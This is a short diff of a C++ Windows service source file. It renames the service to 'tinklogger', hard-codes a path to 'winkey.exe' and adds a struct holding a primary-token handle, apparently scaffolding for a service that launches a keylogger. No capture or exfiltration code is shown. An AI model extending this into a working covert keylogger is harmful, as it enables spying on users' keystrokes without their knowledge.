@@ -5,12 +5,25 @@
 # include <winsvc.h>
 # include <iostream>
 # include <string>
-#include <tchar.h>
-#include <strsafe.h>
+# include <tchar.h>
+# include <strsafe.h>
+# include <TlHelp32.h>
 
-# define SVCNAME TEXT("tinknotyy")
+
+# define SVCNAME TEXT("tinklogger")
+# define WINKEY_PATH TEXT("C:\\Users\\Devicekiller402\\Projects\\tinky-winkey\\winkey.exe")
+
 
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "kernel32.lib")
+
+typedef struct	__SERVICE_STATUS
+{
+	SERVICE_STATUS_HANDLE	__hServiceStatusHandle;
+	SERVICE_STATUS			__ServiceStatus;
+	HANDLE                  __serviceStopEvent;
+	HANDLE					__winkeyPrimaryToken;
+}				SERVICE_STATUS_GLB;
 
 class Tinky {
 public:
